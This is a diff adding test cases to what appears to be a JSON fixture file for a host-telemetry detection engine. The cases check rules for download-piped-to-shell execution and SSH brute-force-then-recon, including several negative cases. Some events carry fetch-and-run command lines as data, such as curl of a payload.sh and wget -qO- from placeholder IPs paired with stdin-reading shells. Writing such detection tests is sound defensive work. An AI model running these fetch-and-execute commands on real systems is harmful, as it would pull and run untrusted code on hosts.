@@ -2687,6 +2687,19 @@
           "5",
           "7"
         ]
+      },
+      {
+        "rule": "temporal:linux-bruteforce-success-recon",
+        "anchor": "7",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5",
+          "6",
+          "7"
+        ]
       }
     ]
   },
@@ -5084,5 +5097,976 @@
       }
     ],
     "matches": []
+  },
+  {
+    "name": "脚本内 curl | bash：兄弟进程同一时刻启动",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -s --connect-timeout 3 http://10.0.0.1/payload.sh",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-download-pipe-shell",
+        "anchor": "1",
+        "evidence": [
+          "2",
+          "1"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "脚本内 curl | bash：读 stdin 的 shell 先被采到",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 11,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -s --connect-timeout 3 http://10.0.0.1/payload.sh",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-download-pipe-shell",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "wget -qO- | sh -s 带参数，三秒内共现",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "www-data",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "wget",
+            "file": {
+              "path": "/usr/bin/wget"
+            },
+            "cmd_line": "wget -qO- http://198.51.100.7/x",
+            "parent_process": {
+              "cmd_line": "sh -c id"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 13,
+        "group": "A",
+        "asset": "host-1",
+        "username": "www-data",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "dash",
+            "file": {
+              "path": "/usr/bin/dash"
+            },
+            "cmd_line": "sh -s - --quiet",
+            "parent_process": {
+              "cmd_line": "sh -c id"
+            }
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-download-pipe-shell",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "共现凑齐后再来探活 curl 不重复命中",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -s --connect-timeout 3 http://10.0.0.1/payload.sh",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 11,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 12,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -s http://127.0.0.1:9100/metrics",
+            "parent_process": {
+              "cmd_line": "/usr/sbin/cron"
+            }
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-download-pipe-shell",
+        "anchor": "2",
+        "evidence": [
+          "1",
+          "2"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "监控探活 curl 与六秒后的交互式子 shell 不关联",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -s http://127.0.0.1:9100/metrics",
+            "parent_process": {
+              "cmd_line": "/usr/sbin/cron"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 16,
+        "group": "A",
+        "asset": "host-1",
+        "username": "ops",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "-bash"
+            }
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "先下载到文件再执行、sh -c 与登录 shell 都不是读 stdin",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "ops",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -fsSL -o /tmp/install.sh https://example.invalid/install.sh",
+            "parent_process": {
+              "cmd_line": "-bash"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 11,
+        "group": "A",
+        "asset": "host-1",
+        "username": "ops",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash /tmp/install.sh",
+            "parent_process": {
+              "cmd_line": "-bash"
+            }
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 12,
+        "group": "A",
+        "asset": "host-1",
+        "username": "ops",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "dash",
+            "file": {
+              "path": "/usr/bin/dash"
+            },
+            "cmd_line": "sh -c 'echo hello'",
+            "parent_process": {
+              "cmd_line": "bash /tmp/install.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 12,
+        "group": "A",
+        "asset": "host-1",
+        "username": "ops",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "-bash",
+            "parent_process": {
+              "cmd_line": "sshd: ops@pts/0"
+            }
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "下载与读 stdin 的 shell 不跨主机关联",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -s --connect-timeout 3 http://10.0.0.1/payload.sh",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-2",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "成功登录在失败集中之前，不构成爆破得手",
+    "events": [
+      {
+        "id": "6",
+        "seconds": 5,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 1,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "5",
+        "seconds": 50,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "7",
+        "seconds": 90,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "whoami",
+            "file": {
+              "path": "/usr/bin/whoami"
+            },
+            "cmd_line": "whoami"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-auth-burst",
+        "anchor": "5",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5"
+        ]
+      },
+      {
+        "rule": "temporal:linux-bruteforce-then-recon",
+        "anchor": "7",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5",
+          "7"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "爆破得手的账号与执行侦察的账号不同",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "5",
+        "seconds": 50,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "6",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "username": "deploy",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 1,
+          "user": {
+            "name": "deploy"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "7",
+        "seconds": 90,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "whoami",
+            "file": {
+              "path": "/usr/bin/whoami"
+            },
+            "cmd_line": "whoami"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-auth-burst",
+        "anchor": "5",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "公网扫描爆破 root，运维用自己账号登录后排查",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "root"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 20,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "root"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "3",
+        "seconds": 30,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "root"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "4",
+        "seconds": 40,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "root"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "5",
+        "seconds": 50,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 2,
+          "user": {
+            "name": "root"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "6",
+        "seconds": 60,
+        "group": "A",
+        "asset": "host-1",
+        "username": "ops",
+        "os": "linux",
+        "classUid": 3002,
+        "raw": {
+          "activity_id": 1,
+          "status_id": 1,
+          "user": {
+            "name": "ops"
+          },
+          "src_endpoint": {
+            "ip": "192.0.2.10"
+          },
+          "service": {
+            "name": "sshd"
+          }
+        }
+      },
+      {
+        "id": "7",
+        "seconds": 90,
+        "group": "A",
+        "asset": "host-1",
+        "username": "ops",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "whoami",
+            "file": {
+              "path": "/usr/bin/whoami"
+            },
+            "cmd_line": "whoami"
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-auth-burst",
+        "anchor": "5",
+        "evidence": [
+          "1",
+          "2",
+          "3",
+          "4",
+          "5"
+        ]
+      }
+    ]
   }
 ]
